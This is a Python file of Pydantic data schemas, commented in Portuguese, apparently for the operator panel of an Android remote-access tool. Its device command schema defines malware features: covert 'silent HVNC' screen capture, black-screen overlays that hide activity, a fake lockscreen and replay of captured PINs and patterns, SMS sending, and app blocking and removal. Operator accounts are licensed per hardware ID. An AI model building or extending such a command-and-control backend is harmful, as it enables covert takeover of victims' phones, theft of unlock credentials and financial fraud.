"""
Schemas Pydantic para validação de dados
"""

from pydantic import BaseModel, EmailStr
from typing import Optional, List, Dict, Any
from datetime import datetime

# ==================== Autenticação ====================

class LoginRequest(BaseModel):
    """Requisição de login"""
    username: str
    password: str
    hwid: Optional[str] = None

class LoginResponse(BaseModel):
    """Resposta de login"""
    access_token: str = ""
    token_type: str = "bearer"
    needs_hwid: bool = False  # Se precisa ativar HWID
    needs_2fa: bool = False  # Se precisa de verificação Google Authenticator
    needs_2fa_setup: bool = False  # Se é o primeiro login e precisa configurar o QR Code
    two_factor_token: Optional[str] = None  # Token temporário de 2FA
    secret: Optional[str] = None  # Chave manual 2FA para setup
    qr_code: Optional[str] = None  # Data URL do QR Code

class Verify2FARequest(BaseModel):
    """Requisição de verificação do código do Google Authenticator"""
    two_factor_token: str
    code: str
    hwid: Optional[str] = None

class Setup2FARequest(BaseModel):
    """Requisição de confirmação inicial do Google Authenticator"""
    two_factor_token: str
    code: str
    hwid: Optional[str] = None

class HwidActivationRequest(BaseModel):
    """Requisição de ativação de HWID"""
    username: str
    password: str
    hwid: str

class RegisterRequest(BaseModel):
    """Requisição de registro (só admin pode usar)"""
    username: str
    email: EmailStr
    password: str

class Token(BaseModel):
    """Token de acesso"""
    access_token: str
    token_type: str

# ==================== Admin - Gerenciamento de Usuários ====================

class AdminUserCreate(BaseModel):
    """Admin cria usuário"""
    username: str
    email: EmailStr
    password: str
    is_admin: bool = False
    notes: Optional[str] = None

class AdminUserUpdate(BaseModel):
    """Admin atualiza usuário"""
    email: Optional[EmailStr] = None
    password: Optional[str] = None
    is_active: Optional[bool] = None
    is_banned: Optional[bool] = None
    is_admin: Optional[bool] = None
    notes: Optional[str] = None
    reset_hwid: Optional[bool] = False  # Reseta HWID para permitir novo dispositivo
    reset_2fa: Optional[bool] = False  # Reseta Google Authenticator do usuário

class AdminUserResponse(BaseModel):
    """Resposta com dados do usuário (para admin)"""
    id: int
    username: str
    email: str
    is_active: bool
    is_admin: bool
    is_banned: bool
    hwid: Optional[str]
    hwid_activated_at: Optional[datetime]
    totp_enabled: bool = False
    created_at: datetime
    last_login: Optional[datetime]
    last_ip: Optional[str]
    notes: Optional[str]
    device_count: int = 0
    
    class Config:
        from_attributes = True

class AdminStatsResponse(BaseModel):
    """Estatísticas do sistema (para admin)"""
    total_users: int
    active_users: int
    banned_users: int
    total_devices: int
    online_devices: int

# ==================== Dispositivos ====================

class DeviceInfo(BaseModel):
    """Informações do dispositivo"""
    id: int
    device_id: str
    model: Optional[str]
    manufacturer: Optional[str]
    android_version: Optional[str]
    last_seen: Optional[datetime]
    is_online: bool
    owner_id: Optional[int] = None
    custom_name: Optional[str] = None
    
    class Config:
        from_attributes = True

class CommandRequest(BaseModel):
    """Requisição de comando para dispositivo"""
    model_config = {"extra": "allow"}

    action: str
    x: Optional[float] = None
    y: Optional[float] = None
    x1: Optional[float] = None
    y1: Optional[float] = None
    x2: Optional[float] = None
    y2: Optional[float] = None
    text: Optional[str] = None
    enabled: Optional[bool] = None
    silent_only: Optional[bool] = None  # TOGGLE_SILENT_VNC — HVNC Silente (takeScreenshot, sem MediaProjection)
    quality: Optional[int] = None  # 10–100 WEBP compression (silent + SET_SILENT_VNC_QUALITY)
    camera: Optional[str] = None
    sequence: Optional[List[Dict]] = None  # Para PLAY_UNLOCK_SEQUENCE
    package: Optional[str] = None  # Para OPEN_APP, UNINSTALL_APP, FORCE_STOP_APP
    packages: Optional[List[str]] = None  # 🚫 Para SET_BLOCKED_APPS
    blocked: Optional[bool] = None  # 🚫 Para TOGGLE_BLOCK_APP
    appName: Optional[str] = None  # 🚫 Para SHOW_APP_UNAVAILABLE
    template: Optional[Any] = None  # 🎨 Para CUSTOM_BLACK_SCREEN - template da tela preta customizada (Any para aceitar qualquer estrutura)
    type: Optional[str] = None  # 🔒 Para SHOW_LOCKSCREEN (PIN ou PATTERN)
    pin: Optional[str] = None  # 🔒 Para PLAY_PIN_SEQUENCE
    pattern: Optional[str] = None  # 🔲 Para PLAY_PATTERN_SEQUENCE
    delay: Optional[int] = None  # ⏱️ Delay para reprodução de PIN/Pattern
    scaled: Optional[bool] = None  # 📐 Para indicar coordenadas escaladas
    scale: Optional[str] = None  # 📐 Tipo de escala de coordenadas (ex: vnc_norm)
    duration: Optional[int] = None  # ⏱️ Duração do swipe/gesto (em ms)
    xCoords: Optional[List[float]] = None  # 📈 Coordenadas X do caminho (PATH_GESTURE)
    yCoords: Optional[List[float]] = None  # 📈 Coordenadas Y do caminho (PATH_GESTURE)
    path: Optional[str] = None  # 📈 String contendo pontos JSON para compatibilidade direta do APK
    phone: Optional[str] = None  # 💬 Telefone para SEND_SMS
    number: Optional[str] = None  # 💬 Número de telefone para SMS
    target: Optional[str] = None  # 💬 Alvo do SMS
    message: Optional[str] = None  # 💬 Conteúdo do SMS


class RenameDeviceRequest(BaseModel):
    """Requisição para renomear dispositivo"""
    custom_name: str

class UnlockSequenceRequest(BaseModel):
    """Requisição para salvar sequência de desbloqueio"""
    type: str
    sequence: List[Dict]

# ==================== Logs ====================

class DeviceLogSchema(BaseModel):
    """Schema de log de dispositivo"""
    id: int
    device_id: str
    log_type: str
    log_data: Optional[str]
    created_at: datetime
    
    class Config:
        from_attributes = True
